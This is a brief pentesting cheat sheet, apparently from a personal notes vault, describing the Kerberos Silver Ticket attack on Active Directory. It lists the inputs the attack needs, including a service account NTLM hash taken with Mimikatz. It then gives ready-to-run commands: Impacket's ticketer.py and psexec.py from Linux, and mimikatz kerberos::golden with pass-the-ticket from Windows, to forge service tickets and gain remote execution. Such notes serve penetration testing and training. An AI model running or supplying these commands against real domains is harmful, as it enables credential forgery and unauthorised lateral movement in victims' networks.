---
id: Silver Tickets
aliases:
  - Silver Tickets
tags:
  - windows
  - AD
  - passwords
  - pivoting
  - kerberos
  - lateral
---
Steal a service account's NTLM hash and use it to forge a TGS ticket which can be used access specific services on the network.
## Required information

- SPN's NTLM hash
    - e.g. Mimikatz
- Domain SID
    - Run `whoami /user`
    - Isolate the SID -> Remove the last part (after the -)
- Target machine
    - FQDN -> i.e. `web04.corp.com`
    - Where SPN runs
    - Service is for instance HTTP

## From Linux
```bash
ticketer.py -nthash "$HASH" -spn "$SPN" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" "$USER"
export KRB5CCNAME="/root/impacket-examples/$TICKET_NAME.ccache"
psexec.py "$DOMAIN"/"$USER"@"$TARGET" -k -no-pass
```

## From Windows

1. Run mimikatz.exe
2. Run `kerberos::golden`:
```mimikatz
kerberos::golden /sid:$DOMAIN_SID /domain:$DOMAIN /ptt /target:$TARGET /service:$SERVICE /rc4:$HASH /user:$TARGET_USER
exit
```
3. Check that the ticket was created with `klist`